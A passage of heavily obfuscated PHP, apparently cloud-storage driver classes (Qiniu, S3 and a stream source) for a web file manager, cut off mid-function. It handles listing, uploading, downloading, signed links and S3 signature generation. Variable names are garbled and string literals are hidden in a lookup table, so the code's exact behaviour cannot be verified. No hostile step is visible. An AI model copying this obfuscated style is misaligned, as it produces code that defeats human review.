goto d×Ç‡ƒº÷í; FêÔ†Ó‡–å: $D÷Œ…¯ñç… =& $_SERVER[í™]; $d¿É°˜‹¬ = trim($d¿É°˜‹¬, $D÷Œ…¯ñç…[8]); $a°Ûô—«ç = empty($d¿É°˜‹¬) ? $D÷Œ…¯ñç…[33] : $d¿É°˜‹¬ . $D÷Œ…¯ñç…[8]; goto A„ƒ¼õë¼³; d×Ç‡ƒº÷í: $dğœé‡ = $fê‘àÊ‘£Ç = array(); while (!0) { list($aƒÛåİ, $fñ¼²À…éÎ) = $this->bucketManager->listFiles($this->bucket, $a°Ûô—«ç, $B¥¦„ùÙˆ, $c‹§ñ ŞºÂ, $dÄæ˜ëğøÛ); if ($fñ¼²À…éÎ) { return !1; } $B¥¦„ùÙˆ = array_key_exists($D÷Œ…¯ñç…[1169], $aƒÛåİ) ? $B¥¦„ùÙˆ = $aƒÛåİ[$D÷Œ…¯ñç…[1200]] : $D÷Œ…¯ñç…[33]; if (isset($aƒÛåİ[$D÷Œ…¯ñç…[1204]])) { foreach ($aƒÛåİ[$D÷Œ…¯ñç…[1204]] as $EÖ„é‰ÄìÑ) { if ($EÖ„é‰ÄìÑ == $a°Ûô—«ç) { continue; } $dğœé‡[] = $this->folderInfo($EÖ„é‰ÄìÑ, $B¬Éæ¡õœ); } } if (isset($aƒÛåİ[$D÷Œ…¯ñç…[1201]])) { foreach ($aƒÛåİ[$D÷Œ…¯ñç…[1201]] as $f³İ±‘‹ê) { if ($f³İ±‘‹ê[$D÷Œ…¯ñç…[89]] == $a°Ûô—«ç) { continue; } $fê‘àÊ‘£Ç[] = $this->fileInfo($f³İ±‘‹ê[$D÷Œ…¯ñç…[89]], $B¬Éæ¡õœ, $f³İ±‘‹ê); } } if ($B¥¦„ùÙˆ == $D÷Œ…¯ñç…[33]) { break; } } return array($D÷Œ…¯ñç…[74] => $dğœé‡, $D÷Œ…¯ñç…[73] => $fê‘àÊ‘£Ç); goto b‰î„–¿é; b‰î„–¿é: } public function has($Cšˆ¢‹ªì›, $F¦ˆîã™å = false, $cÁÑ–Æ×²ê = true) { goto Aìèª·¦ªÔ; Aìèª·¦ªÔ: $E£›ò£§¤¦ =& $_SERVER[í™]; $Cšˆ¢‹ªì› = trim($Cšˆ¢‹ªì›, $E£›ò£§¤¦[8]); $déõ÷çÄå = empty($Cšˆ¢‹ªì›) ? $E£›ò£§¤¦[33] : $Cšˆ¢‹ªì› . $E£›ò£§¤¦[8]; goto c†ª¨›œ³; bØ¶¹šß˜ß: $Cñìò‚›å = 0; $aÃÛĞ÷Û‰ = 0; while (!0) { list($E·ƒÆ—®µ³, $C»Ã°¡¥ª…) = $this->bucketManager->listFiles($this->bucket, $déõ÷çÄå, $bÌÍä›‰Ó©, $Aæä©¦öã±, $FÉ¶¡Ú¶»); if ($C»Ã°¡¥ª…) { return !1; } $bÌÍä›‰Ó© = array_key_exists($E£›ò£§¤¦[1169], $E·ƒÆ—®µ³) ? $bÌÍä›‰Ó© = $E·ƒÆ—®µ³[$E£›ò£§¤¦[1200]] : $E£›ò£§¤¦[33]; if ($F¦ˆîã™å) { if (!empty($E·ƒÆ—®µ³[$E£›ò£§¤¦[1201]])) { $Cñìò‚›å += count($E·ƒÆ—®µ³[$E£›ò£§¤¦[1201]]); } if (!empty($E·ƒÆ—®µ³[$E£›ò£§¤¦[1204]])) { $aÃÛĞ÷Û‰ += count($E·ƒÆ—®µ³[$E£›ò£§¤¦[1204]]); } if ($bÌÍä›‰Ó© === $E£›ò£§¤¦[33]) { break; } continue; } if ($cÁÑ–Æ×²ê) { if (!empty($E·ƒÆ—®µ³[$E£›ò£§¤¦[1201]])) { return !0; } } else { if (!empty($E·ƒÆ—®µ³[$E£›ò£§¤¦[1204]])) { return !0; } } if ($bÌÍä›‰Ó© == $E£›ò£§¤¦[33]) { break; } } goto fŸ‰±ÃœÜ; c†ª¨›œ³: $bÌÍä›‰Ó© = $E£›ò£§¤¦[33]; $Aæä©¦öã± = 1000; $FÉ¶¡Ú¶» = $E£›ò£§¤¦[8]; goto bØ¶¹šß˜ß; fŸ‰±ÃœÜ: if ($F¦ˆîã™å) { return array($E£›ò£§¤¦[191] => $Cñìò‚›å, $E£›ò£§¤¦[192] => $aÃÛĞ÷Û‰); } return !1; goto dˆ½«îÎ‚ë; dˆ½«îÎ‚ë: } public function listAll($B®¾ÕĞ‹±) { $f°‚¨§“ªš =& $_SERVER[í™]; $cá¥Ñõ¤Ú÷ = $this->fileList($B®¾ÕĞ‹±, 1); $e½ˆëÊÇ­® = array(); foreach ($cá¥Ñõ¤Ú÷ as $aÆ÷è¸‘‡…) { $e½ˆëÊÇ­®[$aÆ÷è¸‘‡…[$f°‚¨§“ªš[28]]] = $aÆ÷è¸‘‡…[$f°‚¨§“ªš[77]]; } return $this->listAllFiles($B®¾ÕĞ‹±, array_keys($e½ˆëÊÇ­®), $e½ˆëÊÇ­®); } public function canRead($B”…±Ü¹) { return $this->exist($B”…±Ü¹) ? !0 : !1; } public function canWrite($aùƒÓìö„³) { return $this->exist($aùƒÓìö„³) ? !0 : !1; } public function getContent($B„Ñ‰«°Šô) { return $this->fileSubstr($B„Ñ‰«°Šô, 0, -1); } public function setContent($eŞ‰Ôë•¨µ, $CÊ°®Å¯ï± = '') { $dÍƒŠÙÄŒ = $this->tempFile($this->pathThis($eŞ‰Ôë•¨µ)); file_put_contents($dÍƒŠÙÄŒ, $CÊ°®Å¯ï±); if ($this->upload($eŞ‰Ôë•¨µ, $dÍƒŠÙÄŒ)) { $this->tempFileRemve($dÍƒŠÙÄŒ); return !0; } return !1; } public function refreshUrls($AÄî£ÃŠœĞ) { goto bÊ®ô­Ÿå; e••ÁñÁ°: $CòšïšÆªÑ = new Qiniu\Cdn\CdnManager($this->auth); list($FÇÅ¬Ì¸á¼, $b˜Â†Ñ‡êâ) = $CòšïšÆªÑ->refreshUrls($F´óèîóîî); if ($b˜Â†Ñ‡êâ) { return !1; } goto DšªÈ‘‘é; DšªÈ‘‘é: return $FÇÅ¬Ì¸á¼[$Aì¤½š´‘¾[1205]] == $Aì¤½š´‘¾[678] ? !0 : !1; goto Bå¾Şâƒõ; bÊ®ô­Ÿå: $Aì¤½š´‘¾ =& $_SERVER[í™]; $F´óèîóîî = array(); if (is_array($AÄî£ÃŠœĞ)) { foreach ($AÄî£ÃŠœĞ as $c©ĞÖŠ›“è) { $F´óèîóîî[] = $this->link($c©ĞÖŠ›“è); } } else { $F´óèîóîî[] = $this->link($AÄî£ÃŠœĞ); } goto e••ÁñÁ°; Bå¾Şâƒõ: } public function fileSubstr($c¸¬ÂÃö¸ø, $CÆ§¬–˜¼®, $Cä‘÷ÂìãÇ) { $A÷ÂÍ˜¨ =& $_SERVER[í™]; if (!($D”ù›Ä¾™¨ = $this->link($c¸¬ÂÃö¸ø))) { return !1; } $A‰÷Àî‘Ø = !1; if ($Cä‘÷ÂìãÇ > 0) { $dê›Ÿ´¶°ø = $CÆ§¬–˜¼® + $Cä‘÷ÂìãÇ - 1; $A‰÷Àî‘Ø = array($A÷ÂÍ˜¨[1206] . $CÆ§¬–˜¼® . $A÷ÂÍ˜¨[412] . $dê›Ÿ´¶°ø); } $Dš÷‡ìÎôÒ = url_request($D”ù›Ä¾™¨, $A÷ÂÍ˜¨[216], !1, $A‰÷Àî‘Ø); return $Dš÷‡ìÎôÒ[$A÷ÂÍ˜¨[671]] ? $Dš÷‡ìÎôÒ[$A÷ÂÍ˜¨[1020]] : !1; } public function upload($BÄ¼ÍÑ¶ï, $bÍÃ¯ÛëÔ, $Déâ´Üèë = false, $DÕÌğáÑÁ­ = REPEAT_REPLACE) { $dÊàÊøá˜‘ = new Qiniu\Storage\UploadManager(); $Aí… ×ËÊ = $this->auth->uploadToken($this->bucket, $BÄ¼ÍÑ¶ï); $BÍÆ„Ğ‹… = get_file_mime(get_path_ext($bÍÃ¯ÛëÔ)); list($AÑÊµÖ†¨®, $E×¢–‡¿—¼) = $dÊàÊøá˜‘->putFile($Aí… ×ËÊ, $BÄ¼ÍÑ¶ï, $bÍÃ¯ÛëÔ, null, $BÍÆ„Ğ‹…); return $E×¢–‡¿—¼ ? !1 : $this->getPathOuter($BÄ¼ÍÑ¶ï); } public function uploadFormData($FÃ¦›¾¤¾¬, $aë¡•™ñÜ™ = 3600) { return $this->uploadToken($FÃ¦›¾¤¾¬, $aë¡•™ñÜ™); } public function multiUploadFormData($CªÏšé†Ã, $Dï§¿æ÷ñ¿ = 3600) { return $this->uploadToken($CªÏšé†Ã, $Dï§¿æ÷ñ¿); } private function uploadToken($f´–¨—‹Ù, $eîÓå¡ª… = 3600) { goto e¸À‡¶ñÒ; e¸À‡¶ñÒ: $bˆ½ØÚ‡åÓ =& $_SERVER[í™]; $cÃ¹£Õİƒ = $eîÓå¡ª…; $FŒ‰†Ò·óÉ = array($bˆ½ØÚ‡åÓ[1207] => $bˆ½ØÚ‡åÓ[1208]); goto FÎŒ¨Ã¼Ì¼; FÎŒ¨Ã¼Ì¼: $e¦šˆÙæ¹§ = $f´–¨—‹Ù; $EÜ›îµùá¶ = $this->auth->uploadToken($this->bucket, $e¦šˆÙæ¹§, $cÃ¹£Õİƒ, $FŒ‰†Ò·óÉ, !0); $eµ¬‚Æ…Êß = empty($this->region) || $this->region == $bˆ½ØÚ‡åÓ[1209] ? $bˆ½ØÚ‡åÓ[33] : $bˆ½ØÚ‡åÓ[412] . $this->region; goto EÅ®µŞ¿¢Ñ; EÅ®µŞ¿¢Ñ: $Fß¨é°á¬» = http_type() . "\x3a\x2f\x2f\165\x70\x6c\157\141\144{$eµ¬‚Æ…Êß}\56\x71\151\x6e\151\x75\160\x2e\x63\x6f\x6d\x2f"; return array($bˆ½ØÚ‡åÓ[1210] => $EÜ›îµùá¶, $bˆ½ØÚ‡åÓ[1211] => $Fß¨é°á¬»); goto D¶àï¸Ì”×; D¶àï¸Ì”×: } public function download($f£™Õ¡ËÕ, $EóíÖ¥¤©) { goto fø´–ÔŸ¥˜; cêÙ“İ: fclose($C§óÖÆ›ø); return $EóíÖ¥¤©; goto F¾ˆ‚ÃõâÃ; fø´–ÔŸ¥˜: $BÜæëš„ = IO::getPathInner(IO::mkfile($EóíÖ¥¤©)); if (!($B¾ÖœÃ•¥ï = $this->link($f£™Õ¡ËÕ))) { return !1; } $Cï†èî«—• = 0; goto bĞ†‡²–„†; bĞ†‡²–„†: $FÒÄéœğÈö = 1024 * 200; $C§óÖÆ›ø = fopen($BÜæëš„, $_SERVER[í™][1212]); while (!0) { $dç¦èØÈî = $this->fileSubstr($f£™Õ¡ËÕ, $Cï†èî«—•, $FÒÄéœğÈö); if ($dç¦èØÈî === !1) { return !1; } fwrite($C§óÖÆ›ø, $dç¦èØÈî); $Cï†èî«—• += $FÒÄéœğÈö; if (strlen($dç¦èØÈî) < $FÒÄéœğÈö) { break; } } goto cêÙ“İ; F¾ˆ‚ÃõâÃ: } public function link($d­Í™×è§Ğ, $c² ¸ß”– = '') { if (!$this->isFile($d­Í™×è§Ğ)) { return !1; } $eë„ù¨ÈÃÅ = $this->getHost() . $_SERVER[í™][8] . $this->pathEncode($d­Í™×è§Ğ) . $c² ¸ß”–; return $this->auth->privateDownloadUrl($eë„ù¨ÈÃÅ, 3600 * 12); } public function fileOut($c÷ù¼Â˜óù, $d“à²×à£í = false, $BíôßŒª«­ = false, $B¨ë…¾œ‡¤ = '') { $BˆŸ¶¥ÉÅÂ =& $_SERVER[í™]; if ($this->isFileOutServer()) { return $this->fileOutServer($c÷ù¼Â˜óù, $d“à²×à£í, $BíôßŒª«­, $B¨ë…¾œ‡¤); } if (!$BíôßŒª«­) { $BíôßŒª«­ = $this->pathThis($c÷ù¼Â˜óù); } $d‚¨ÜÓ¿¤ = $d“à²×à£í ? $BˆŸ¶¥ÉÅÂ[1213] . rawurlencode($BíôßŒª«­) : $BˆŸ¶¥ÉÅÂ[33]; $e»æ—‹é²Š = $this->link($c÷ù¼Â˜óù, $d‚¨ÜÓ¿¤); $this->fileOutLink($e»æ—‹é²Š); } public function fileOutServer($FÔå·ç¡„‡, $EÓÔğÛ‘Ú = false, $fˆ·´‘æÁì = false, $a¸¢†Ğòåß = '') { parent::fileOut($FÔå·ç¡„‡, $EÓÔğÛ‘Ú, $fˆ·´‘æÁì, $a¸¢†Ğòåß); } public function fileOutImage($c—‰àŠğŠ, $D›§îêø = 250) { $fãô‡Ù›ƒù = $this->link($c—‰àŠğŠ, $_SERVER[í™][1214] . $D›§îêø); $this->fileOutLink($fãô‡Ù›ƒù); } public function fileOutImageServer($B§Ÿ§ÍĞ¯Ô, $Dù³Ï°¼¸ë = 250) { parent::fileOutImage($B§Ÿ§ÍĞ¯Ô, $Dù³Ï°¼¸ë); } public function hashMd5($D¹¯•ÑÇ ô) { $BËìŒ­èê¿ =& $_SERVER[í™]; $eÓ‡¶ØôÇ¹ = $this->objectMeta($D¹¯•ÑÇ ô); return isset($eÓ‡¶ØôÇ¹[$BËìŒ­èê¿[196]]) ? $eÓ‡¶ØôÇ¹[$BËìŒ­èê¿[196]] : !1; $BèšÕ¯ÌÒÑ = $this->link($D¹¯•ÑÇ ô, $BËìŒ­èê¿[1215]); } public function size($B—õ–éŞÄÛ) { $DÔ­¤ö¯¸ = $this->objectMeta($B—õ–éŞÄÛ); return $DÔ­¤ö¯¸ ? $DÔ­¤ö¯¸[$_SERVER[í™][77]] : 0; } public function info($eÊÙÜâ¹¨¯) { if ($this->isFolder($eÊÙÜâ¹¨¯)) { return $this->folderInfo($eÊÙÜâ¹¨¯); } else { if ($this->isFile($eÊÙÜâ¹¨¯)) { return $this->fileInfo($eÊÙÜâ¹¨¯); } } return !1; } public function exist($d³èÒÇÊÌ) { return $this->isFile($d³èÒÇÊÌ) || $this->isFolder($d³èÒÇÊÌ); } public function isFile($C«´ğ×æŠÑ) { return !$this->isFolder($C«´ğ×æŠÑ) && $this->objectMeta($C«´ğ×æŠÑ); } public function isFolder($Bòİ¼÷«‡ç) { return $this->cacheMethod($_SERVER[í™][223], $Bòİ¼÷«‡ç); } protected function objectMeta($fìª—ƒÕ¹†) { return $this->cacheMethod($_SERVER[í™][224], $fìª—ƒÕ¹†); } protected function _objectMeta($F–Š”…¡‡) { $A¹…Š³ëÊ =& $_SERVER[í™]; list($F‰ôŠŸ‰¯«, $E£ µË›ÁÈ) = $this->bucketManager->stat($this->bucket, $F–Š”…¡‡); if ($F‰ôŠŸ‰¯«) { $F‰ôŠŸ‰¯«[$A¹…Š³ëÊ[77]] = intval($F‰ôŠŸ‰¯«[$A¹…Š³ëÊ[1202]]); } return $F‰ôŠŸ‰¯«; } protected function _isFolder($FÀ³Îƒë¡) { $f¯¾ï†à›Ù =& $_SERVER[í™]; if ($FÀ³Îƒë¡ == $f¯¾ï†à›Ù[33] || $FÀ³Îƒë¡ == $f¯¾ï†à›Ù[8]) { return !0; } list($d§íÙ¯ô, $Cö„¡¯ÀÓã) = $this->bucketManager->listFiles($this->bucket, trim($FÀ³Îƒë¡, $f¯¾ï†à›Ù[8]) . $f¯¾ï†à›Ù[8], $f¯¾ï†à›Ù[33], 1, $f¯¾ï†à›Ù[8]); return !empty($d§íÙ¯ô[$f¯¾ï†à›Ù[1201]]) || !empty($d§íÙ¯ô[$f¯¾ï†à›Ù[1204]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($eğ“Ôï²ãß) { parent::__construct($eğ“Ôï²ãß); } public function uploadFormData($e¯ôŞâ’Ë, $C¸Û›ñÒÚ© = 3600) { goto eà‘ÑÇğÖÚ; dÑõÕŠã¸•: $Fõå¦æÖÅÎ = $EäîˆÀ»ÑÄ[1122]; $FïÖ¡İ¨ = $C¸Û›ñÒÚ© . $EäîˆÀ»ÑÄ[33]; $CåŠÓ…·¼ö = $EäîˆÀ»ÑÄ[1086]; goto AœÆ¾®Ûêà; CÛ’¨ë¾¿İ: $DŸœ¨¦ÊĞó = base64_encode(json_encode($aâ¦†Ä¦ÆÇ)); $dø‡Îİª™µ = hash_hmac($EäîˆÀ»ÑÄ[1130], $Fôà¾Ó²š, $EäîˆÀ»ÑÄ[1131] . $this->secret, !0); $a­š‰Ù›î = hash_hmac($EäîˆÀ»ÑÄ[1130], $this->region, $dø‡Îİª™µ, !0); goto CåæÄ…×è£; bšµÅ›³İ”: $FˆöÇ­¶ƒ = array($EäîˆÀ»ÑÄ[199] => $EäîˆÀ»ÑÄ[33], $EäîˆÀ»ÑÄ[1132] => $EäîˆÀ»ÑÄ[33], $EäîˆÀ»ÑÄ[1090] => $F‘Ø¢İ›ª’, $EäîˆÀ»ÑÄ[1094] => $CåŠÓ…·¼ö, $EäîˆÀ»ÑÄ[1098] => $DŸœ¨¦ÊĞó, $EäîˆÀ»ÑÄ[1133] => $bÉŒĞ’ºÛƒ, $EäîˆÀ»ÑÄ[1134] => $D×óŸÂØ×, $EäîˆÀ»ÑÄ[1135] => $FòºßÚô¨, $EäîˆÀ»ÑÄ[1136] => $FïÖ¡İ¨, $EäîˆÀ»ÑÄ[1137] => $eĞ•ŒÏ˜¥, $EäîˆÀ»ÑÄ[169] => $this->getHost()); return $FˆöÇ­¶ƒ; goto bÀïğÖ—àŠ; CåæÄ…×è£: $d¥Û·»Îä = hash_hmac($EäîˆÀ»ÑÄ[1130], $CËŠÁ¬¬‡¼, $a­š‰Ù›î, !0); $Cî§­ßˆåÖ = hash_hmac($EäîˆÀ»ÑÄ[1130], $Fõå¦æÖÅÎ, $d¥Û·»Îä, !0); $eĞ•ŒÏ˜¥ = hash_hmac($EäîˆÀ»ÑÄ[1130], $DŸœ¨¦ÊĞó, $Cî§­ßˆåÖ); goto bšµÅ›³İ”; eà‘ÑÇğÖÚ: $EäîˆÀ»ÑÄ =& $_SERVER[í™]; $F‘Ø¢İ›ª’ = $EäîˆÀ»ÑÄ[185]; $D×óŸÂØ× = $EäîˆÀ»ÑÄ[1120]; goto c…šê˜¹ò®; c…šê˜¹ò®: $CËŠÁ¬¬‡¼ = $EäîˆÀ»ÑÄ[59]; $FòºßÚô¨ = gmdate($EäîˆÀ»ÑÄ[1121]); $Fôà¾Ó²š = gmdate($EäîˆÀ»ÑÄ[672]); goto dÑõÕŠã¸•; AœÆ¾®Ûêà: $D‰İë©›Ù = array($this->accessKey, $Fôà¾Ó²š, $this->region, $CËŠÁ¬¬‡¼, $Fõå¦æÖÅÎ); $bÉŒĞ’ºÛƒ = implode($EäîˆÀ»ÑÄ[8], $D‰İë©›Ù); $aâ¦†Ä¦ÆÇ = array($EäîˆÀ»ÑÄ[1088] => gmdate($EäîˆÀ»ÑÄ[1087], strtotime($EäîˆÀ»ÑÄ[1123])), $EäîˆÀ»ÑÄ[1089] => array(array($EäîˆÀ»ÑÄ[1091] => $this->bucket), array($EäîˆÀ»ÑÄ[1090] => $F‘Ø¢İ›ª’), array($EäîˆÀ»ÑÄ[1092], $EäîˆÀ»ÑÄ[1093], $EäîˆÀ»ÑÄ[33]), array($EäîˆÀ»ÑÄ[1092], $EäîˆÀ»ÑÄ[1124], $EäîˆÀ»ÑÄ[33]), array($EäîˆÀ»ÑÄ[1092], $EäîˆÀ»ÑÄ[1125], $EäîˆÀ»ÑÄ[33]), array($EäîˆÀ»ÑÄ[1094] => $CåŠÓ…·¼ö), array($EäîˆÀ»ÑÄ[1126] => $bÉŒĞ’ºÛƒ), array($EäîˆÀ»ÑÄ[1127] => $D×óŸÂØ×), array($EäîˆÀ»ÑÄ[1128] => $FòºßÚô¨), array($EäîˆÀ»ÑÄ[1129] => $FïÖ¡İ¨))); goto CÛ’¨ë¾¿İ; bÀïğÖ—àŠ: } public function multiUploadFormData($cæƒ‡‹‰ã¥, $aÚ¡Ë“©í¦ = 3600) { $Aí´„–†Ëî =& $_SERVER[í™]; $FŒø‚ê¸ê = gmdate($Aí´„–†Ëî[1216]); $F—¸•ˆ×ğÖ = array(); $E›äË£éõì = $this->client->getUploadId($this->bucket, $cæƒ‡‹‰ã¥, $F—¸•ˆ×ğÖ); if (!$E›äË£éõì) { return !1; } return array($Aí´„–†Ëî[209] => $E›äË£éõì, $Aí´„–†Ëî[169] => $this->getHost() . $Aí´„–†Ëî[8] . $this->pathEncode($cæƒ‡‹‰ã¥), $Aí´„–†Ëî[210] => $FŒø‚ê¸ê, $Aí´„–†Ëî[89] => $cæƒ‡‹‰ã¥); } public function multiUploadAuthData($cˆŠæ¢•Ó, $D«Ê’ÑÍñ´ = array()) { goto a¤õƒÚšïõ; a¤õƒÚšïõ: $FÈØ¿‚¯ºó =& $_SERVER[í™]; $d•ò¥À²‡Î = isset($D«Ê’ÑÍñ´[$FÈØ¿‚¯ºó[160]]) ? $D«Ê’ÑÍñ´[$FÈØ¿‚¯ºó[160]] : $FÈØ¿‚¯ºó[33]; $BÄ¡§‡øŒ = $D«Ê’ÑÍñ´[$FÈØ¿‚¯ºó[89]]; goto e¥¬ˆªš’¹; e¥¬ˆªš’¹: unset($D«Ê’ÑÍñ´[$FÈØ¿‚¯ºó[89]]); if (isset($D«Ê’ÑÍñ´[$FÈØ¿‚¯ºó[211]])) { return $this->listUploadParts($BÄ¡§‡øŒ, $D«Ê’ÑÍñ´); } $bÛ¥öÒÇï° = array(); goto aéÇ˜àæŸ; cë¯ºøĞÓ: if (strpos($d•ò¥À²‡Î, $FÈØ¿‚¯ºó[213]) === 0) { if (isset($bÛ¥öÒÇï°[$FÈØ¿‚¯ºó[1218]])) { $bÒÙøó¼Î÷ = $bÛ¥öÒÇï°[$FÈØ¿‚¯ºó[1218]]; } else { if (isset($d­Êª—à™[$FÈØ¿‚¯ºó[1218]])) { $bÒÙøó¼Î÷ = $d­Êª—à™[$FÈØ¿‚¯ºó[1218]]; } else { $bÒÙøó¼Î÷ = hash($FÈØ¿‚¯ºó[1130], $FÈØ¿‚¯ºó[33]); } } return array($FÈØ¿‚¯ºó[220] => $d­Êª—à™[$FÈØ¿‚¯ºó[220]], $FÈØ¿‚¯ºó[1218] => $bÒÙøó¼Î÷, $FÈØ¿‚¯ºó[210] => $d­Êª—à™[$FÈØ¿‚¯ºó[1221]]); } return $d­Êª—à™[$FÈØ¿‚¯ºó[220]]; goto CØ½ó­ØÚº; eèÓÍŒÔº†: $B¬¦°œÙ–® = $FÈØ¿‚¯ºó[214]; $C÷è®Ç£Î® = $FÈØ¿‚¯ºó[8] . $this->pathEncode($BÄ¡§‡øŒ) . $d•ò¥À²‡Î; $d­Êª—à™ = $this->client->__getSignatureV4($bÛ¥öÒÇï°, $D£”ìÏ»²¼, $B¬¦°œÙ–®, $C÷è®Ç£Î®); goto cë¯ºøĞÓ; aéÇ˜àæŸ: if (isset($D«Ê’ÑÍñ´[$FÈØ¿‚¯ºó[1217]])) { $bÛ¥öÒÇï°[$FÈØ¿‚¯ºó[1218]] = $D«Ê’ÑÍñ´[$FÈØ¿‚¯ºó[1217]]; } $c«¼Øº÷ = explode($FÈØ¿‚¯ºó[171], $this->getHost()); $D£”ìÏ»²¼ = array($FÈØ¿‚¯ºó[1219] => $c«¼Øº÷[1], $FÈØ¿‚¯ºó[1220] => $FÈØ¿‚¯ºó[33], $FÈØ¿‚¯ºó[199] => $FÈØ¿‚¯ºó[116], $FÈØ¿‚¯ºó[1132] => $D«Ê’ÑÍñ´[$FÈØ¿‚¯ºó[77]]); goto eèÓÍŒÔº†; CØ½ó­ØÚº: } public function listUploadParts($e˜‘™ïë, $BÉ‹à¡ºÊÕ = array()) { goto D¾‹ñŸåé­; D¾‹ñŸåé­: $bÊ…’Ôñ•„ =& $_SERVER[í™]; $e¨çÕèëÌ = str_replace($bÊ…’Ôñ•„[221], $bÊ…’Ôñ•„[33], $BÉ‹à¡ºÊÕ[$bÊ…’Ôñ•„[160]]); $c­èåÛ‚§‰ = $this->client->listParts($this->bucket, $e˜‘™ïë, $e¨çÕèëÌ); goto díšµº¢¬; c‹»×‰ˆØœ: $C½½³…Á¹ã = array($bÊ…’Ôñ•„[1219] => $C™»‡‰âÒï[1], $bÊ…’Ôñ•„[199] => $bÊ…’Ôñ•„[116], $bÊ…’Ôñ•„[1132] => strlen($F†Å‚¿ˆÌÀ)); $cÜêŠâï² = $bÊ…’Ôñ•„[212]; $cÔ†‚ï¼ù‘ = $bÊ…’Ôñ•„[8] . $this->pathEncode($e˜‘™ïë) . $BÉ‹à¡ºÊÕ[$bÊ…’Ôñ•„[160]]; goto dÛÎİëÔ“¾; aˆøĞÊ¦äÅ: $F†Å‚¿ˆÌÀ .= $bÊ…’Ôñ•„[1225]; $dÖƒ×÷ºÄ¤ = array(); $C™»‡‰âÒï = explode($bÊ…’Ôñ•„[171], $this->getHost()); goto c‹»×‰ˆØœ; dÛÎİëÔ“¾: $dàÙè÷£àø = $this->client->__getSignatureV4($dÖƒ×÷ºÄ¤, $C½½³…Á¹ã, $cÜêŠâï², $cÔ†‚ï¼ù‘, $F†Å‚¿ˆÌÀ); return array($bÊ…’Ôñ•„[220] => $dàÙè÷£àø[$bÊ…’Ôñ•„[220]], $bÊ…’Ôñ•„[210] => $dàÙè÷£àø[$bÊ…’Ôñ•„[1221]], $bÊ…’Ôñ•„[222] => $c­èåÛ‚§‰, $bÊ…’Ôñ•„[1218] => $dàÙè÷£àø[$bÊ…’Ôñ•„[1218]]); goto F¢š­ÃİŠÒ; díšµº¢¬: if (!$c­èåÛ‚§‰) { return !1; } $F†Å‚¿ˆÌÀ = $bÊ…’Ôñ•„[1222]; foreach ($c­èåÛ‚§‰ as $fÉì×ã‰Ï) { $F†Å‚¿ˆÌÀ .= $bÊ…’Ôñ•„[1223] . "\74\x50\141\162\164\x4e\165\x6d\142\x65\x72\x3e{$fÉì×ã‰Ï[$bÊ…’Ôñ•„[1174]]}\x3c\x2f\x50\141\x72\164\116\x75\x6d\x62\145\162\x3e\xa" . "\x3c\105\x54\x61\x67\x3e{$fÉì×ã‰Ï[$bÊ…’Ôñ•„[1175]]}\x3c\57\105\124\x61\147\76\xa" . $bÊ…’Ôñ•„[1224]; } goto aˆøĞÊ¦äÅ; F¢š­ÃİŠÒ: } public function link($Eîâ°–“—÷, $eÎ¦™ê´ÚÍ = array()) { return parent::link($Eîâ°–“—÷, $eÎ¦™ê´ÚÍ); } public function fileOut($f°¢ÂÕ×§á, $FØ•Ë¤Å¢‹ = false, $CåÔ šƒ = false, $BÌ„½ŒÅœŠ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[í™][1226])) { return parent::fileOutServer($f°¢ÂÕ×§á, $FØ•Ë¤Å¢‹, $CåÔ šƒ, $BÌ„½ŒÅœŠ); } parent::fileOut($f°¢ÂÕ×§á, $FØ•Ë¤Å¢‹, $CåÔ šƒ, $BÌ„½ŒÅœŠ); } public function fileOutImage($D—··Š†§–, $eÙ¯†…‚ïË = 250) { if (strstr($this->endpoint, $_SERVER[í™][1226])) { return parent::fileOutImageServer($D—··Š†§–, $eÙ¯†…‚ïË); } parent::fileOutImage($D—··Š†§–, $eÙ¯†…‚ïË); } public function fileOutLink($FØÎĞó–É†) { $c—’ñ¼”’ =& $_SERVER[í™]; if (substr($FØÎĞó–É†, 0, 7) == $c—’ñ¼”’[1101]) { $FØÎĞó–É† = $c—’ñ¼”’[1102] . substr($FØÎĞó–É†, 7); } header($c—’ñ¼”’[156] . $FØÎĞó–É†); die; } public function getHost() { $e¹ò¾¤„ÔÌ =& $_SERVER[í™]; $FçÙ¹î›Š = str_rtrim(parent::getHost(), $e¹ò¾¤„ÔÌ[8] . $this->bucket); $FçÙ¹î›Š = explode($e¹ò¾¤„ÔÌ[171], $FçÙ¹î›Š); return $FçÙ¹î›Š[0] . $e¹ò¾¤„ÔÌ[171] . $this->bucket . $e¹ò¾¤„ÔÌ[91] . $FçÙ¹î›Š[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($fùõ‹Õİº¼, $a±Ş’Ğİò¬ = 0) { parent::__construct(); $this->source = $fùõ‹Õİº¼; $this->sourceSize = $a±Ş’Ğİò¬; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($F•”®“Â = false) { return $this->sourceSize; } public function getContent($A—ÄŒÛ¿İİ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { if ($this->sourceSize <= 0) { return $_SERVER[í™][33]; } $F…‰ß‰‰ä = ftell($this->source); $c°áæø¿ˆ„ = @fread($this->source, $this->sourceSize); fseek($this->source, $F…‰ß‰‰ä); return $c°áæø¿ˆ„; } } public function fileSubstr($d±áä«À¢æ = false, $FÈ´ÉÙ¥„ˆ = 0, $F¸ØÆÂ…š = 0) { if (!$F¸ØÆÂ…š) { $F¸ØÆÂ…š = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $FÈ´ÉÙ¥„ˆ, $F¸ØÆÂ…š); } if ($this->sourceType == self::TYPE_FILE) { if ($F¸ØÆÂ…š <= 0) { return $_SERVER[í™][33]; } $cÈö‘ïöÎ = ftell($this->source); fseek($this->source, $cÈö‘ïöÎ + $FÈ´ÉÙ¥„ˆ); $c°“Ü¬ŠÇ = @fread($this->source, $F¸ØÆÂ…š); fseek($this->source, $cÈö‘ïöÎ); return $c°“Ü¬ŠÇ; } } public function hashMd5($aÎ†Éó‘¾Â = false) { return md5($this->getContent()); } public static function hash($Eè¨«Ä Ë¼, $a‘÷–ŞÀ†Ú = 0) { $f™¬×ñœî = new PathDriverStream($Eè¨«Ä Ë¼, $a‘÷–ŞÀ†Ú); return $f™¬×ñœî->hashSimple($Eè¨«Ä Ë¼); } public static function md5($cÆàÍæİÙÄ, 